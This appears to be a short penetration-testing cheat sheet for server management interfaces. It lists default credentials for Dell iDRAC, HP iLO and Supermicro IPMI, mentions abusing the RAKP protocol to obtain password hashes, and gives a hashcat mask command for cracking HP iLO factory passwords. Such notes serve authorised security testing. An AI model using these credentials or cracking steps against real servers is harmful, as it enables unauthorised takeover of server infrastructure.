==> Default credentials

PRODUCT	              USERNAME	      PASSWORD
Dell iDRAC            root            calvin
HP iLO	              Administrator   randomized (8-character string consisting of numbers and uppercase letters)
Supermicro IPMI	      ADMIN           ADMIN

-> If default creds don't work, maybe a flaw in the RAKP protocol will work (transmitted SHA1 or MD5 hash)

--> In case of HP iLO with factory default password:
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u (8 character password)
